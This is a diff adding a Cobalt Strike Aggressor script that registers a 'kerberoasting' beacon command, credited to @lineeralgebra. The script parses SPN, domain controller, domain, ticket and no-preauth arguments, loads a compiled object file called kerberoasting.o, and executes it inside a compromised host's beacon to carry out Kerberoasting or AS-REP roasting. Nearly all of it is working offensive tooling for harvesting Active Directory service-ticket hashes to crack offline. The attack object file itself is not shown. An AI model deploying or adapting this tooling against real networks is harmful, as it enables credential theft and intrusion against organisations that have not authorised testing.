@@ -1,0 +1,77 @@
+beacon_command_register("kerberoasting", "Perform Kerberoasting",
+    "Perform Kerberoasting:\n\n" .
+    "Usage:\n" .
+    "    kerberoasting /spn:SPN [/dc:DC] [/domain:DOMAIN] [/ticket:BASE64] [/nopreauth:USER]\n\n" .
+    "Parameters:\n" .
+    "    /spn         - Target Service Principal Name (required)\n" .
+    "    /dc          - Domain Controller to query (optional)\n" .
+    "    /domain      - Target domain name (optional)\n" .
+    "    /ticket      - Base64 encoded TGT ticket (optional)\n" .
+    "    /nopreauth   - Username for AS-REP roasting (optional)\n"
+);
+
+alias kerberoasting {
+    local('$bid $barch $handle $data $args $spn $dc $domain $ticket $nopreauth $arg $i $msg');
+    $bid = $1;
+
+    $spn = "";
+    $dc = "";
+    $domain = "";
+    $ticket = "";
+    $nopreauth = "";
+
+    # Parse arguments
+    for ($i = 1; $i < size(@_); $i++) {
+        $arg = @_[$i];
+        if (strlen($arg) >= 5 && substr($arg, 0, 5) eq "/spn:") {
+            $spn = substr($arg, 5);
+        }
+        else if (strlen($arg) >= 4 && substr($arg, 0, 4) eq "/dc:") {
+            $dc = substr($arg, 4);
+        }
+        else if (strlen($arg) >= 8 && substr($arg, 0, 8) eq "/domain:") {
+            $domain = substr($arg, 8);
+        }
+        else if (strlen($arg) >= 8 && substr($arg, 0, 8) eq "/ticket:") {
+            $ticket = substr($arg, 8);
+        }
+        else if (strlen($arg) >= 11 && substr($arg, 0, 11) eq "/nopreauth:") {
+            $nopreauth = substr($arg, 11);
+        }
+    }
+
+    if ($spn eq "") {
+        berror($bid, "Usage: kerberoasting /spn:<spn> [/dc:<dc>] [/domain:<domain>] [/ticket:<ticket>] [/nopreauth:<user>]");
+        return;
+    }
+
+    # Determine architecture
+    $barch = barch($bid);
+
+    # Read the BOF file
+    $handle = openf(script_resource("kerberoasting.o"));
+    $data   = readb($handle, -1);
+    closef($handle);
+
+    # Pack arguments (z = zero-terminated string)
+    $args = bof_pack($bid, "zzzzz", $spn, $domain, $dc, $ticket, $nopreauth);
+
+    # Log action
+    $msg = "Running kerberoasting BOF by @lineeralgebra\n  SPN: $spn";
+    if ($dc ne "") {
+        $msg = $msg . "\n  DC: $dc";
+    }
+    if ($domain ne "") {
+        $msg = $msg . "\n  Domain: $domain";
+    }
+    if ($ticket ne "") {
+        $msg = $msg . "\n  Ticket: [supplied]";
+    }
+    if ($nopreauth ne "") {
+        $msg = $msg . "\n  NoPreAuth: $nopreauth";
+    }
+    btask($bid, $msg);
+
+    # Execute
+    beacon_inline_execute($bid, $data, "go", $args);
+}
